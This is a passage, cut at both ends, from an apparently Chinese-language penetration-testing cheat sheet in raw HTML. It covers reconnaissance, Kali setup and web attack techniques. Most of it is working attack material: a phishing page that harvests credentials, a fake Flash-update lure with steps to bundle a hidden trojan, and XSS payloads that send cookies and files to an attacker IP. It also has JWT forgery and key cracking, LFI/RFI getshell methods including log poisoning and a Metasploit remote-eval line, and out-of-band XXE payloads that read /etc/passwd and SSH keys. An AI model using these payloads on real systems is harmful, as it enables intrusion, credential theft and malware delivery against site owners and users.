历史泄露过的资料等</h2>\n<pre><code>库\nhttps://haveibeenpwned.com/\nhttps://github.com/kernelmachine/haveibeenpwned\n</code></pre>\n<h2 id=\"githubgitee等代码托管平台\"><a class=\"anchor\" href=\"#githubgitee等代码托管平台\">#</a> Github/Gitee 等代码托管平台</h2>\n<pre><code>https://github.com/dxa4481/truffleHog\nhttps://github.com/lijiejie/GitHack\nhttps://github.com/MiSecurity/x-patrol\nhttps://github.com/az0ne/Github_Nuggests\nhttps://github.com/mazen160/GithubCloner克隆用户的github\n</code></pre>\n<h2 id=\"被入侵网址列表\"><a class=\"anchor\" href=\"#被入侵网址列表\">#</a> 被入侵网址列表</h2>\n<pre><code>http://zone-h.org/archive\nwooyun镜像查找目标企业曾出现的漏洞\n</code></pre>\n<h2 id=\"gps查询\"><a class=\"anchor\" href=\"#gps查询\">#</a> GPS 查询</h2>\n<pre><code>https://www.opengps.cn/Default.aspx\n</code></pre>\n<h2 id=\"网站url提取\"><a class=\"anchor\" href=\"#网站url提取\">#</a> 网站 URL 提取</h2>\n<pre><code>http://www.bulkdachecker.com/url-extractor/\n</code></pre>\n<h2 id=\"蜜罐判断参考一下即可\"><a class=\"anchor\" href=\"#蜜罐判断参考一下即可\">#</a> 蜜罐判断 (参考一下即可)</h2>\n<pre><code>https://honeyscore.shodan.io/\n</code></pre>\n<h2 id=\"默认密码\"><a class=\"anchor\" href=\"#默认密码\">#</a> 默认密码</h2>\n<pre><code>https://default-password.info/\nhttp://routerpasswords.com\n</code></pre>\n<h2 id=\"如需注册\"><a class=\"anchor\" href=\"#如需注册\">#</a> 如需注册</h2>\n<pre><code>Sms\n  https://www.materialtools.com/\n  http://receivefreesms.com/\nEmail\n  https://10minutemail.net/\n  https://zh.mytrashmailer.com/\n  http://24mail.chacuo.net/enus\n  https://www.linshiyouxiang.net/\nFake id\n  https://www.fakenamegenerator.com/\n  http://www.haoweichi.com/\n  https://www.fakeaddressgenerator.com/\n</code></pre>\n<h2 id=\"企业信息\"><a class=\"anchor\" href=\"#企业信息\">#</a> 企业信息</h2>\n<pre><code>天眼查、企查查、企业信用信息公示系统\n企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计\n</code></pre>\n<h1 id=\"入口点\"><a class=\"anchor\" href=\"#入口点\">#</a> 入口点</h1>\n<h2 id=\"win10-安装kaliwsl\"><a class=\"anchor\" href=\"#win10-安装kaliwsl\">#</a> win10 安装 kali (wsl)</h2>\n<pre><code>Microsoft Store查找kali下载。\nPowershell执行\n&gt;Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux\n源设置vim /etc/apt/source.list\ndeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free \ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\ndeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n&gt;sudo su\n&gt;passwd root修改root密码\n&gt;apt-get update &amp;apt-get upgrade 更新\n&gt;apt-get dist-upgrade \n&gt;apt-get clean\ncmd&gt;kali config --default-user root 设置默认启动用户为root\ncmd&gt;net stop/start LxssManager重启服务\n&gt;apt-get install metasploit-framework\n&gt;apt install kali-linux-full 安装完整kali工具集\n</code></pre>\n<h2 id=\"水坑攻击\"><a class=\"anchor\" href=\"#水坑攻击\">#</a> 水坑攻击</h2>\n<h3 id=\"xss克隆钓鱼\"><a class=\"anchor\" href=\"#xss克隆钓鱼\">#</a> XSS 克隆钓鱼</h3>\n<pre><code>保存js&amp;css到服务器，登录action改为接受密码的文件action=&quot;./pass.php&quot;\n&lt;?php //php\n  $user=$_POST['username'];\n  $pass=$_POST['password'];\n  $file=fopen('pass.txt','a+');\n  fwrite($file,$user.&quot;|&quot;.&quot;pass&quot; . &quot;\\n&quot;);\n  fclose($file);\n  echo &quot;&lt;script&gt;window.location.href=\\&quot;http://192.168.0.1\\&quot;&lt;/script&gt;\\n&quot;;\n?&gt;\n构造payload\n&lt;script&gt;window.location.href=&quot;http://192.168.0.1/login.html&quot;&lt;/script&gt;\nphp –S 0.0.0.0:8080 –t ./\n</code></pre>\n<h3 id=\"伪造页面钓鱼\"><a class=\"anchor\" href=\"#伪造页面钓鱼\">#</a> 伪造页面钓鱼</h3>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h2>\n<h2 id=\"1\"><a class=\"anchor\" href=\"#1\">#</a> 1</h2>\n<pre><code>https://github.com/r00tSe7en/Fake-flash.cn\n添加xss平台模块\nwindow.alert = function(name)&#123;\nvar iframe = document.createElement(&quot;IFRAME&quot;);\niframe.style.display=&quot;none&quot;;\niframe.setAttribute(&quot;src&quot;,'data:text/plain');\ndocument.documentElement.appendChild(iframe);\nwindow.frames[0].window.alert(name);\niframe.parentNode.removeChild(iframe);\n&#125;\nalert(&quot;您的FLASH版本过低，尝试升级后访问该页面！&quot;);\nwindow.location.href=&quot;http://www.flash.com&quot;;\n制作自解压捆绑\n一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级-&gt;自解压选项，设置解压路径，c:\\windows\\temp\\，设置-&gt;解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。\nResourceHacker修改文件图标\n</code></pre>\n<h2 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> </h2>\n<h2 id=\"2\"><a class=\"anchor\" href=\"#2\">#</a> 2</h2>\n<pre><code>  if(empty($_COOKIE['flash']))&#123;\n      echo '&lt;script&gt;alert(&quot;你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！&quot;);window.location=&quot;http://www.flash.cn.xx.com/&quot;&lt;/script&gt;';\n      setcookie(&quot;flash&quot;,&quot;true&quot;,time()+30*2400);\n  &#125;\n</code></pre>\n<h2 id=\"对外服务攻击\"><a class=\"anchor\" href=\"#对外服务攻击\">#</a> 对外服务攻击</h2>\n<h3 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h3>\n<h2 id=\"-3\"><a class=\"anchor\" href=\"#-3\">#</a> </h2>\n<h2 id=\"前端逻辑漏洞\"><a class=\"anchor\" href=\"#前端逻辑漏洞\">#</a> 前端 / 逻辑漏洞</h2>\n<h2 id=\"-4\"><a class=\"anchor\" href=\"#-4\">#</a> </h2>\n<h3 id=\"注册\"><a class=\"anchor\" href=\"#注册\">#</a> 注册</h3>\n<pre><code>任意用户注册\n可爆破用户名\n注入\nXSS\n</code></pre>\n<h2 id=\"-5\"><a class=\"anchor\" href=\"#-5\">#</a> </h2>\n<h3 id=\"登录\"><a class=\"anchor\" href=\"#登录\">#</a> 登录</h3>\n<pre><code>爆破用户名，密码\n注入\n万能密码\nXss\nXss+Csrf\n修改返回包信息，登入他人账户\n修改cookie中的参数，如user,adminid等\n</code></pre>\n<h2 id=\"-6\"><a class=\"anchor\" href=\"#-6\">#</a> </h2>\n<h3 id=\"任意密码重置\"><a class=\"anchor\" href=\"#任意密码重置\">#</a> 任意密码重置</h3>\n<pre><code>1．重置一个账户，不发送验证码，设置验证码为空发送请求。\n2．发送验证码，查看相应包\n3．验证码生存期的爆破\n4．修改相应包为成功的相应包\n5．手工直接跳转到校验成功的界面\n6．两个账户，重置别人密码时，替换验证码为自己正确的验证码\n7．重置别人密码时，替换为自己的手机号\n8．重置自己的成功时，同意浏览器重置别人的，不发验证码\n9．替换用户名，ID，cookie，token参数等验证身份的参数\n10．通过越权修改他人的找回信息如手机/邮箱来重置\n</code></pre>\n<h2 id=\"-7\"><a class=\"anchor\" href=\"#-7\">#</a> </h2>\n<h3 id=\"信息泄露-2\"><a class=\"anchor\" href=\"#信息泄露-2\">#</a> 信息泄露</h3>\n<pre><code>HTML源码、JS等查看信息搜集一章\n</code></pre>\n<h2 id=\"-8\"><a class=\"anchor\" href=\"#-8\">#</a> </h2>\n<h3 id=\"后台\"><a class=\"anchor\" href=\"#后台\">#</a> 后台</h3>\n<pre><code>登录参数修改为注册参数/reg、/register、/sign等\n</code></pre>\n<h2 id=\"-9\"><a class=\"anchor\" href=\"#-9\">#</a> </h2>\n<h2 id=\"jwt攻击手法\"><a class=\"anchor\" href=\"#jwt攻击手法\">#</a> JWT 攻击手法</h2>\n<pre><code>https://jwt.io/#debugger-io\n</code></pre>\n<h2 id=\"-10\"><a class=\"anchor\" href=\"#-10\">#</a> </h2>\n<h3 id=\"未校验签名\"><a class=\"anchor\" href=\"#未校验签名\">#</a> 未校验签名</h3>\n<pre><code>将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求\n</code></pre>\n<h2 id=\"-11\"><a class=\"anchor\" href=\"#-11\">#</a> </h2>\n<h3 id=\"禁用哈希\"><a class=\"anchor\" href=\"#禁用哈希\">#</a> 禁用哈希</h3>\n<p><img data-src=\"1.png\" alt=\"\" /><br></p>\n<pre><code>Alg代表加密方式，修改用户名等身份认证的地方，把HS256设置为none生成token发送请求，使用python的pyjwt模块\n</code></pre>\n<p><img data-src=\"2.png\" alt=\"\" /><br></p>\n<pre><code>jwt.encode(&#123;'user':'admin','arg1':'value1','arg2':'value2'&#125;,algorithm='none',key='')\n</code></pre>\n<h2 id=\"-12\"><a class=\"anchor\" href=\"#-12\">#</a> </h2>\n<h3 id=\"暴破弱密钥\"><a class=\"anchor\" href=\"#暴破弱密钥\">#</a> 暴破弱密钥</h3>\n<pre><code>&gt;pip3 install pyjwt\n&gt;python3 crack.py\nimport jwt\nimport termcolor\n\njwt_str = R'token'\nwith open('/root/password.txt') as f:\n  for line in f:\n  key_ = line.strip()\n  try:\n    jwt.decode(jwt_str,verify=True,key=key_)\n    print('\\r','\\bfound key --&gt;',termcolor.colored(key_,'green'),'&lt;--')\n    break\n  except(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):\n    print('\\r','\\bfound key --&gt;',termcolor.colored(key_,'green'),'&lt;--')\n  except jwt.exceptions.InvalidSignatureError:\n    print('\\r',' ' * 64, '\\r\\btry',key_,end='',flush=True)\n    continue\nelse:\n  print('\\r','\\bnot found.')\n</code></pre>\n<h2 id=\"-13\"><a class=\"anchor\" href=\"#-13\">#</a> </h2>\n<h2 id=\"xss\"><a class=\"anchor\" href=\"#xss\">#</a> XSS</h2>\n<pre><code>打COOKIE\n&lt;svg/onload=&quot;javascript:document.location.href=('http://xx.xx.xx.xx:7777?cookie='+document.cookie)&quot;&gt;\n读取HTML\n&lt;svg/onload=&quot;document.location='http://xx.xx.xx.xx:7777/?'+btoa(document.body.innerHTML)&quot;&gt;\n读文件\n&lt;svg/onload=&quot;\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n&#123;\n\tif (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)\n\t&#123;\n\t\tdocument.location='http://xx.xx.xx.xx:7777/?'+btoa(xmlhttp.responseText);\n\t&#125;\n&#125;\nxmlhttp.open(&quot;GET&quot;,&quot;file.php&quot;,true);\nxmlhttp.send();\n&quot;&gt;\nXSS+SSRF读取服务器文件\n\n&lt;svg/onload=&quot;\nxmlhttp=new XMLHttpRequest();\nxmlhttp.onreadystatechange=function()\n&#123;\nif (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)\n&#123;\n    document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);\n&#125;\n&#125;\nxmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);\nxmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);\nxmlhttp.send(&quot;url=file:///etc/passwd&quot;);\n&quot;&gt;\n</code></pre>\n<h2 id=\"-14\"><a class=\"anchor\" href=\"#-14\">#</a> </h2>\n<h2 id=\"csrf\"><a class=\"anchor\" href=\"#csrf\">#</a> CSRF</h2>\n<pre><code>查看有无token等验证身份的参数，删掉后是否返回正常\n查看header中referer,origin参数，删掉后是否返回正常\n使用csrftester/burpsuite生成表单，以另一账号和浏览器打开测试\n去掉referer中域名后面的文件夹或文件\n替换二级域名\n</code></pre>\n<h2 id=\"-15\"><a class=\"anchor\" href=\"#-15\">#</a> </h2>\n<h2 id=\"php任意文件读取下载\"><a class=\"anchor\" href=\"#php任意文件读取下载\">#</a> php 任意文件读取 / 下载</h2>\n<pre><code>readfile()、file_get_contents()、fopen()等读文件的函数不严谨，读取文件路径可控，输出内容。\n下载配置文件\nRedis、Weblogic、ftp、mysql、web配置文件、history文件、数据库配置文件\n下载log文件\n下载web文件\n/1.php?f=../../etc/passwd\n/1.php?f=file:///etc/passwd(file://绕过../的防护)\n/1.php?f=file:///etc/passwd\n</code></pre>\n<h2 id=\"-16\"><a class=\"anchor\" href=\"#-16\">#</a> </h2>\n<h2 id=\"php文件包含\"><a class=\"anchor\" href=\"#php文件包含\">#</a> php 文件包含</h2>\n<pre><code>函数:\ninclude\nrequire\ninclude_once\nrequire_once\n</code></pre>\n<h2 id=\"-17\"><a class=\"anchor\" href=\"#-17\">#</a> </h2>\n<h3 id=\"常用协议\"><a class=\"anchor\" href=\"#常用协议\">#</a> 常用协议</h3>\n<pre><code>file:// — 访问本地文件系统\nfile协议的工作目录是当前目录，使用file:///wwwroot/1.php等同于./wwwroot/1.php可用于绕过一些情况\nphp:// — 访问各个输入/输出流（I/O streams）\n</code></pre>\n<p><img data-src=\"3.png\" alt=\"\" /></p>\n<pre><code>读取\n/1.php?file=php://filter/read=convert.base64-encode/resource=./1.php\n写入\n/1.php?file=php://filter/write=convert.base64-decode/resource=[file]&quot;,&quot;base64\n</code></pre>\n<h2 id=\"-18\"><a class=\"anchor\" href=\"#-18\">#</a> </h2>\n<h3 id=\"getshell\"><a class=\"anchor\" href=\"#getshell\">#</a> Getshell</h3>\n<pre><code>https://github.com/D35m0nd142/LFISuite\n</code></pre>\n<h2 id=\"-19\"><a class=\"anchor\" href=\"#-19\">#</a> </h2>\n<h2 id=\"-20\"><a class=\"anchor\" href=\"#-20\">#</a> </h2>\n<h2 id=\"allow_url_include-开启时getshell\"><a class=\"anchor\" href=\"#allow_url_include-开启时getshell\">#</a> allow_url_include 开启时 Getshell</h2>\n<pre><code>远程文件包含\n/1.php?file=http://remote.com/shell.txt\n/1.php?file=php://input  POST:&lt;?php phpinfo();?&gt;\n或使用curl\n&gt;curl -v &quot;http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot; -d &quot;&lt;?php phpinfo();?&gt;&quot;\n或使用data://协议解析base64的代码\n/1.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==\n</code></pre>\n<h2 id=\"-21\"><a class=\"anchor\" href=\"#-21\">#</a> </h2>\n<h2 id=\"-22\"><a class=\"anchor\" href=\"#-22\">#</a> </h2>\n<h2 id=\"allow_url_include-关闭时getshell\"><a class=\"anchor\" href=\"#allow_url_include-关闭时getshell\">#</a> allow_url_include 关闭时 Getshell</h2>\n<pre><code>攻击机开启共享\n/1.php?file=//attacker/1.php\n创建webdav服务，shell文件放入目录包含即可\n&gt;docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav\nShell文件放入/root/webdav/data\n/1.php?file=//attacker/1.php\n</code></pre>\n<h2 id=\"-23\"><a class=\"anchor\" href=\"#-23\">#</a> </h2>\n<h2 id=\"-24\"><a class=\"anchor\" href=\"#-24\">#</a> </h2>\n<h2 id=\"包含日志文件getshell\"><a class=\"anchor\" href=\"#包含日志文件getshell\">#</a> 包含日志文件 getshell</h2>\n<pre><code>Fuzz文件\nhttps://github.com/fuzzdb-project/fuzzdb\nhttps://github.com/danielmiessler/SecLists\nhttps://blog.csdn.net/qq_33020901/article/details/78810035\n/1.php?file=&lt;?php phpinfo();?&gt;\n/1.php?file=../../../../../../../var/log/apache2/access.log\nWin下使用phpstudy\n请求/&lt;?php phpinfo();?&gt;\n包含错误日志\n/1.php?file=C:\\phpStudy\\Apache\\logs\\error.log\n</code></pre>\n<h2 id=\"-25\"><a class=\"anchor\" href=\"#-25\">#</a> </h2>\n<h2 id=\"-26\"><a class=\"anchor\" href=\"#-26\">#</a> </h2>\n<h2 id=\"上传个图片格式的木马直接包含\"><a class=\"anchor\" href=\"#上传个图片格式的木马直接包含\">#</a> 上传个图片格式的木马直接包含</h2>\n<pre><code>/1.php?file=/uploadfile/1.jpg\n</code></pre>\n<h2 id=\"-27\"><a class=\"anchor\" href=\"#-27\">#</a> </h2>\n<h2 id=\"-28\"><a class=\"anchor\" href=\"#-28\">#</a> </h2>\n<h2 id=\"限制后缀时\"><a class=\"anchor\" href=\"#限制后缀时\">#</a> 限制后缀时</h2>\n<pre><code>&lt;?php\n$file = $_GET['file'].&quot;.php&quot;;\ninclude($file);\n?&gt;&lt;br&gt;\n利用伪协议zip，构造一个zip压缩包，打包一个shell.php，将压缩包更名为png\n</code></pre>\n<p><img data-src=\"4.png\" alt=\"\" /></p>\n<pre><code>请求/1.php?file=zip://shell.png%23shell\n</code></pre>\n<p><img data-src=\"5.png\" alt=\"\" /></p>\n<pre><code>也可使用phar协议访问\n/1.php?file=phar://shell.png/shell\n老版本可以使用%00截断\n/etc/passwd%00\n(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)\n/var/www/%00\n/etc/passwd/././././././.[…]/./././././.\n(需要 magic_quotes_gpc=off\n(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)\n点号截断：\n/boot.ini/………[…]…………\n(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)\n</code></pre>\n<h2 id=\"-29\"><a class=\"anchor\" href=\"#-29\">#</a> </h2>\n<h2 id=\"-30\"><a class=\"anchor\" href=\"#-30\">#</a> </h2>\n<h2 id=\"phpinfo-lfi-本地文件包含临时文件getshell\"><a class=\"anchor\" href=\"#phpinfo-lfi-本地文件包含临时文件getshell\">#</a> phpinfo-LFI 本地文件包含临时文件 getshell</h2>\n<pre><code>利用临时文件删除时间差获取shell\n需要一个lfi漏洞+phpinfo页面\n在/tmp/目录下生成个密码为f的一句话木马g\n</code></pre>\n<p><img data-src=\"6.png\" alt=\"\" /></p>\n<pre><code>修改脚本的phpinfo文件名称\n</code></pre>\n<p><img data-src=\"7.png\" alt=\"\" /></p>\n<pre><code>LFI文件\n</code></pre>\n<p><img data-src=\"8.png\" alt=\"\" /></p>\n<pre><code>执行\n&gt;python getshell.py 192.168.0.108 80 100\n80是端口、100是线程\n</code></pre>\n<p><img data-src=\"9.png\" alt=\"\" /><br />\n<img data-src=\"10.png\" alt=\"\" /></p>\n<pre><code>http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27\n</code></pre>\n<h2 id=\"-31\"><a class=\"anchor\" href=\"#-31\">#</a> </h2>\n<h2 id=\"-32\"><a class=\"anchor\" href=\"#-32\">#</a> </h2>\n<h2 id=\"session-lfi-getshell\"><a class=\"anchor\" href=\"#session-lfi-getshell\">#</a> session + lfi getshell</h2>\n<pre><code>session.upload_progress.enabled启用时，文件上传会产生进度文件\n/var/lib/php5/sess_\n/var/lib/php/sess_\n</code></pre>\n<h2 id=\"-33\"><a class=\"anchor\" href=\"#-33\">#</a> </h2>\n<h2 id=\"-34\"><a class=\"anchor\" href=\"#-34\">#</a> </h2>\n<h2 id=\"lfi-ssh-log\"><a class=\"anchor\" href=\"#lfi-ssh-log\">#</a> LFI SSH Log</h2>\n<pre><code>&gt;ssh '&lt;?php system($_GET['c']); ?&gt;'@192.168.0.107\n&gt;http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls\n</code></pre>\n<h2 id=\"-35\"><a class=\"anchor\" href=\"#-35\">#</a> </h2>\n<h2 id=\"-36\"><a class=\"anchor\" href=\"#-36\">#</a> </h2>\n<h2 id=\"rfi命令注入上线msf\"><a class=\"anchor\" href=\"#rfi命令注入上线msf\">#</a> RFI &amp; 命令注入上线 MSF</h2>\n<pre><code>MSF生成\n#use exploit/multi/script/web_delivery\n#set target PHP\n注入点注入：\nphp -d allow_url_fopen=true -r &quot;eval(file_get_contents('http://192.168.0.107:1234/OgsOFaj3yKH'));&quot;\nRFI：\nhttp://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH\n</code></pre>\n<h2 id=\"-37\"><a class=\"anchor\" href=\"#-37\">#</a> </h2>\n<h2 id=\"xml\"><a class=\"anchor\" href=\"#xml\">#</a> XML</h2>\n<pre><code>XML设计的宗旨是传输数据，而非显示数据\nXXE=XML外部实体注入、XML=可扩展标记语言\nXml文件声明\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;\nDTD为XML的文档类型定义\n引入外部DTD\n&lt;!DOCTYPE 根元素 SYSTEM &quot;filename&quot;&gt;\n参数实体+外部实体\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE test [\n\t&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;\n\t%file;\n]&gt;\n</code></pre>\n<h2 id=\"-38\"><a class=\"anchor\" href=\"#-38\">#</a> </h2>\n<h3 id=\"xml注入\"><a class=\"anchor\" href=\"#xml注入\">#</a> XML 注入</h3>\n<pre><code>闭合标签，改写xml文件，用户可控，有拼接代码\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&lt;manager&gt;\n\t&lt;admin id=&quot;1&quot;&gt;\n&lt;username&gt;admin&lt;/username&gt;\n&lt;password&gt;admin&lt;/password&gt;\n&lt;/admin&gt;\n&lt;admin id=&quot;2&quot;&gt;\n&lt;username&gt;root&lt;/username&gt;\n&lt;password&gt;root&lt;/password&gt;\n&lt;/admin&gt;\n&lt;/manager&gt;\n若是password可控，拼接代码形成注入\nadmin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;\n</code></pre>\n<h2 id=\"-39\"><a class=\"anchor\" href=\"#-39\">#</a> </h2>\n<h3 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h3>\n<pre><code>https://github.com/AonCyberLabs/xxe-recursive-download\n程序解析XML输入时，未禁止外部实体的加载，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害\n</code></pre>\n<h2 id=\"-40\"><a class=\"anchor\" href=\"#-40\">#</a> </h2>\n<h2 id=\"-41\"><a class=\"anchor\" href=\"#-41\">#</a> </h2>\n<h2 id=\"判断\"><a class=\"anchor\" href=\"#判断\">#</a> 判断</h2>\n<pre><code>回显路径\n\t&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;test&quot;&gt;%remote;]&gt;\nDNSLOG\n\thttp://www.dnslog.cn/\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY dtd SYSTEM &quot;http://xxx.dnslog.cn/xxe&quot;&gt;]&gt;\n&lt;xxe&gt;&amp;dtd;&lt;/xxe&gt;\nWebdav\n\t存在webdav可使用PROPPATCH、PROPFIND、 LOCK等请求方法接受xml输入形成xxe\nWsdl使用AWVS测试\n</code></pre>\n<h2 id=\"-42\"><a class=\"anchor\" href=\"#-42\">#</a> </h2>\n<h2 id=\"-43\"><a class=\"anchor\" href=\"#-43\">#</a> </h2>\n<h2 id=\"挖掘\"><a class=\"anchor\" href=\"#挖掘\">#</a> 挖掘</h2>\n<pre><code>如遇与xml交互的地方\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; \n&lt;!DOCTYPE ANY [  \n&lt;!ENTITY test &quot;this is test&quot;&gt; \n]&gt; \n&lt;root&gt;&amp;test;&lt;/root&gt;\n看是否输出\n检查是否支持外部实体\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; \n&lt;!DOCTYPE ANY [  \n&lt;!ENTITY % foo SYSTEM &quot;http://attacker/evil.xml&quot;&gt; \n%foo;\n]&gt; \n查看你的服务器是否有请求\nJSON content-type XXE\n修改Content-Type: application/xml\nX-Requested-With: XMLHttpRequest\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;参数name&gt;name&lt;/参数name&gt;\n&lt;参数value&gt;&amp;xxe;&lt;/ 参数value&gt;\n&lt;/root&gt;\n</code></pre>\n<h2 id=\"-44\"><a class=\"anchor\" href=\"#-44\">#</a> </h2>\n<h2 id=\"-45\"><a class=\"anchor\" href=\"#-45\">#</a> </h2>\n<h2 id=\"有回显读取本地文件\"><a class=\"anchor\" href=\"#有回显读取本地文件\">#</a> 有回显读取本地文件</h2>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:////etc/passwd&quot;&gt; ]&gt; \n&lt;creds&gt;&amp;goodies;&lt;/creds&gt;\n也可去掉文件列目录\nfile:///root/.sh/id_rsa\n特殊字符\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE roottag [\n&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   \n&lt;!ENTITY % goodies SYSTEM &quot;file:////tmp/xxx.txt&quot;&gt;  \n&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  \n&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt; \n%dtd; ]&gt; \n&lt;roottag&gt;&amp;all;&lt;/roottag&gt;\nevil.dtd\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; \n&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;\n</code></pre>\n<h2 id=\"-46\"><a class=\"anchor\" href=\"#-46\">#</a> </h2>\n<h2 id=\"-47\"><a class=\"anchor\" href=\"#-47\">#</a> </h2>\n<h2 id=\"blind-oob-xxe无回显读取\"><a class=\"anchor\" href=\"#blind-oob-xxe无回显读取\">#</a> Blind OOB XXE 无回显读取</h2>\n<pre><code>需使用参数实体，引用外部DTD\nPayload\n&lt;!DOCTYPE convert [ \n&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;\n%remote;%int;%send;\n]&gt;\ntest.dtd\n&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;\n&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://attacker:9999?p=%file;'&gt;&quot;&gt;\n</code></pre>\n<h2 id=\"-48\"><a class=\"anchor\" href=\"#-48\">#</a> </h2>\n<h2 id=\"-49\"><a class=\"anchor\" href=\"#-49\">#</a> </h2>\n<h2 id=\"列目录\"><a class=\"anchor\" href=\"#列目录\">#</a> 列目录</h2>\n<pre><code>远程payload\n&lt;!ENTITY % a SYSTEM &quot;file:///&quot;&gt; &lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM 'gopher://ip:80/%a;'&gt;&quot;&gt; %b; %c;\n注入payload\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://attacker:80/1.xml&quot;&gt;%remote;]&gt;&lt;root/&gt;\n</code></pre>\n<h2 id=\"-50\"><a class=\"anchor\" href=\"#-50\">#</a> </h2>\n<h2 id=\"-51\"><a class=\"anchor\" href=\"#-51\">#</a> </h2>\n<h2 id=\"不同平台支持的协议\"><a class=\"anchor\" href=\"#不同平台支持的协议\">#</a> 不同平台支持的协议</h2>\n<p><img data-src=\"11.png\" alt=\"\" /></p>\n<h2 id=\"-52\"><a class=\"anchor\" href=\"#-52\">#</a> </h2>\n<h2 id=\"-53\"><a class=\"anchor\" href=\"#-53\">#</a> </h2>\n<h2 id=\"执行命令\"><a class=\"anchor\" href=\"#执行命令\">#</a> 执行命令</h2>\n<pre><code>安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;\n</code></pre>\n<h2 id=\"-54\"><a class=\"anchor\" href=\"#-54\">#</a> </h2>\n<h2 id=\"-55\"><a class=\"anchor\" href=\"#-55\">#</a> </h2>\n<h2 id=\"内网主机探测\"><a class=\"anchor\" href=\"#内网主机探测\">#</a> 内网主机探测</h2>\n<pre><code>可先读取/etc/network/interfaces、/proc/net/arp、/etc/hosts等文件查询IP段\n使用脚本\n</code></pre>\n<h2 id=\"-56\"><a class=\"anchor\" href=\"#-56\">#</a> </h2>\n<h2 id=\"-57\"><a class=\"anchor\" href=\"#-57\">#</a> </h2>\n<h2 